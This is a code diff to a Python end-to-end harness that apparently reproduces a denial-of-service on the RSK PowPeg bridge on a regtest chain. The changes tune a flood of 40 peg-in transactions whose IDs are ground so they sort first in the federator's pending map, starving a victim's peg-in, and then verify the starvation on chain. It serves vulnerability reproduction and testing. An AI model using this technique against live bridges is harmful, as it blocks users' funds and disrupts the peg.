@@ -184,7 +184,13 @@ MIN_PEGIN_SAT = 500_000          # rskj BridgeRegTestConstants.minimumPeginTxVal
 RETIRING_SAT = 2_000             # above dust, far below the minimum
 FANOUT_VALUE = 702_000           # per branch: 500k + 2k + dust + change + fee
 ATTACK_COUNT = 40                # BtcToRskClient.MAXIMUM_REGISTER_BTC_LOCK_TXS_PER_TURN
-BIN_BITS = 10                    # mask 0x3ff, implies bin 0 for any table <= 1024
+BIN_BITS = 7                     # mask 0x7f: bin 0 for any ConcurrentHashMap table
+                                 # up to 128 buckets (96 pending txs). Bit 0..6 of the
+                                 # bucket index are zero, so *every* attack tx sorts
+                                 # ahead of anything else in getTransactionProofs(),
+                                 # which is a ConcurrentHashMap iterated bucket by
+                                 # bucket. 1024 buckets (mask 0x3ff) costs 8x the
+                                 # grinding for no benefit at this map size.
 VICTIM_PEGIN_SAT = 1_000_000     # ordinary, above the minimum, valid
 BTC_CONFIRMATIONS = 3            # btcs2RskMinimumAcceptableConfirmations (regtest)
 
@@ -548,19 +554,23 @@ def retiring_address() -> str:
 def stage_federation():
     st = load_state()
 
-    # createPendingFederation refuses with -2 while any live federation is still
-    # awaiting activation, i.e. until the genesis federation is 150 blocks old
-    # (FederationRegTestConstants.federationActivationAge). With a federator
-    # running, updateCollections keeps that height set, so this is a hard gate.
-    log("[federation] waiting for the genesis federation to reach activation age (150 blocks)")
-    end = time.time() + 600
+    # createPendingFederation has four guards: a pending federation exists (-1),
+    # a proposed one exists (-4, only possible with RSKIP419), a federation is
+    # still awaiting activation (-2, needs both a "new" and an "old" federation in
+    # storage) and a retiring federation exists (-3). On a fresh chain neither the
+    # new nor the old federation slot is populated (FederationStorageProviderImpl
+    # reads them straight from storage, there is no genesis fallback), so none of
+    # the four applies and the vote can run on the very first blocks. Only wait
+    # for the chain to be alive.
+    log("[federation] waiting for the chain to produce a few blocks")
+    end = time.time() + 300
     while time.time() < end:
         blk = int(rsk("eth_blockNumber"), 16)
-        if blk >= 170:
+        if blk >= 3:
             break
-        time.sleep(5)
+        time.sleep(2)
     else:
-        raise RuntimeError("the chain did not reach block 170")
+        raise RuntimeError("the chain did not produce blocks")
     log("             block %d" % int(rsk("eth_blockNumber"), 16))
 
     log("[federation] current federation")
@@ -642,6 +652,24 @@ def stage_federation():
         raise RuntimeError("commitFederation did not clear the pending federation")
     log("             committed; the new federation activates in 150 blocks")
 
+    # With RSKIP419 active the commit only stores a *proposed* federation
+    # (FederationSupportImpl.commitPendingFederation) and the handover waits for
+    # an SVP cycle that a voting round can never complete. That state is easy to
+    # detect, and it would otherwise show up as a silent 15 minute timeout.
+    proposed = 0
+    try:
+        proposed = dec_uint("0x" + bridge_call(sel("getProposedFederationSize()")).hex())
+    except Exception:
+        pass
+    if proposed:
+        bridge_log_tail()
+        raise RuntimeError(
+            "the commit produced a PROPOSED federation (size %d), not a handover: "
+            "RSKIP419 is active on this chain.\n"
+            "  -> $WORK/powpeg.conf must contain blockchain.config.consensusRules.rskip419 = -1\n"
+            "  -> and the node must be started with a fresh database (./e2e/run.sh --keep off)" % proposed)
+    log("             no proposed federation: the handover was direct (RSKIP419 inactive)")
+
     log("[federation] waiting for the new federation to activate (150 blocks)")
     end = time.time() + 900
     retiring = ""
@@ -709,14 +737,14 @@ def btc_best_chain_height() -> int:
 def stage_attack():
     st = load_state()
 
-    # stop RSK block production so the retiring federation cannot expire while we
-    # prepare the transactions; Bitcoin mining keeps running, it is independent
-    try:
-        rsk("evm_stopMining")
-        log("[attack] RSK mining paused: the federation-change window is frozen")
-    except Exception as e:
-        log("[attack] evm_stopMining unavailable (%s); the window keeps running" % e)
-
+    # RSK block production is deliberately NOT paused here. registerBtcTransaction
+    # only takes effect in a mined RSK block, and the Bridge only accepts a peg-in
+    # once it knows that Bitcoin block's header (fed by the federator, 25 headers
+    # per turn), so the chain has to keep producing blocks while the flood is set
+    # up. The whole stage is kept well inside the retiring-federation window: the
+    # window is 150 blocks (FederationRegTestConstants), one block per second, and
+    # this stage spends ~10 s grinding + ~20 blocks catching up the Bridge.
+    log("[attack] the retiring federation window is open; the clock is running")
     active = st["active_address"]
     retiring = st["retiring_address"]
     log("[attack] active   %s" % active)
@@ -821,6 +849,12 @@ def stage_attack():
     save_state(st)
 
     # ---- confirm everything on Bitcoin --------------------------------
+    # the federator's SPV wallet learns a tx from the mempool (onTransaction adds
+    # it to the pending map) and only stores its merkle proof when it later sees
+    # the block (onBlock). Give the mempool relay a moment so the tx is already in
+    # the map when the block arrives, otherwise no proof is ever stored for it and
+    # it is silently skipped forever.
+    time.sleep(3)
     mine(BTC_CONFIRMATIONS + 2)
     log("[attack] %d BTC blocks mined" % (BTC_CONFIRMATIONS + 2))
 
@@ -838,11 +872,42 @@ def stage_attack():
     else:
         log("[attack] Bridge BTC height stuck at %d (target %d)" % (btc_best_chain_height(), target))
 
-    try:
-        rsk("evm_startMining")
-        log("[attack] RSK mining resumed, the powpeg node is now under load")
-    except Exception as e:
-        log("[attack] evm_startMining unavailable (%s)" % e)
+    # ---- prove the flood is actually running before spending 2 more minutes --
+    # A rejection is invisible from the RPC: registerBtcTransaction still mines
+    # with status 0x1 and the Bridge only logs it at DEBUG. What *is* observable
+    # is that the federator keeps sending (its RSK nonce climbs by up to 40 per
+    # turn) while none of the 40 hashes and not the victim's hash ever get a
+    # processed height. If the victim is processed here the attack did not work
+    # and there is no point in measuring.
+    fed_addr = rsk_address(key("e2e-fed-1"))
+    turn0 = int(rsk("eth_getTransactionCount", [fed_addr, "latest"]), 16)
+    log("[attack] federator %s has sent %d txs so far; watching for the retry loop"
+        % (fed_addr[:10], turn0))
+    # bounded: the window is only 150 blocks long, so this may not eat more
+    # than ~30 s of it even in the worst case
+    end = time.time() + 30
+    working = False
+    while time.time() < end:
+        time.sleep(5)
+        if processed_height(st["victim_txid"]) >= 0:
+            stage_measure("early")
+            raise RuntimeError(
+                "the victim peg-in was processed during the window: the flood did not "
+                "starve registerBtcTransaction. Check that all 40 attack txs are in "
+                "bin 0 of the federator's pending map and that the retiring federation "
+                "is still live (see $LOGS/rsk.log, grep updateBridgeBtcTransactions)")
+        n = int(rsk("eth_getTransactionCount", [fed_addr, "latest"]), 16)
+        blk = int(rsk("eth_blockNumber"), 16)
+        log("[attack] block %d: federator nonce %d (+%d), victim still unprocessed"
+            % (blk, n, n - turn0))
+        if n > turn0 + 80:
+            working = True
+            break
+    if not working:
+        log("[attack] WARNING: the federator nonce did not climb; measuring anyway")
+    else:
+        log("[attack] flood confirmed on chain: txs are being (re)sent every turn and "
+            "nothing gets marked processed")
 
 
 # ---------------------------------------------------------------------------
@@ -872,10 +937,16 @@ def stage_measure(label="t"):
     unprocessed = sum(1 for h in ah if h < 0)
     attacker_rsk = rsk_address(ATTACKER)
 
+    try:
+        fed_nonce = int(rsk("eth_getTransactionCount", [rsk_address(key("e2e-fed-1")), "latest"]), 16)
+    except Exception:
+        fed_nonce = -1
+
     out = {
         "label": label,
         "rsk_block": int(rsk("eth_blockNumber"), 16),
         "retiring_present": bool(dec_bytes("0x" + bridge_call(sel("getRetiringFederationAddress()")).hex()).decode(errors="ignore")),
+        "federator_nonce": fed_nonce,
         "victim_balance_wei": str(vic_bal),
         "victim_processed_height": vic_h,
         "attacker_processed": len(ah) - unprocessed,
@@ -886,6 +957,8 @@ def stage_measure(label="t"):
     log("  --- measurement (%s) ---" % label)
     log("  RSK block                  %d   retiring fed live: %s"
         % (out["rsk_block"], out["retiring_present"]))
+    log("  federator nonce            %d  (registerBtcTransaction txs sent)"
+        % out["federator_nonce"])
     log("  victim  balance            %s wei" % out["victim_balance_wei"])
     log("  victim  processed height   %d  (-1 = never)" % vic_h)
     log("  attack  40 txs processed   %d" % out["attacker_processed"])
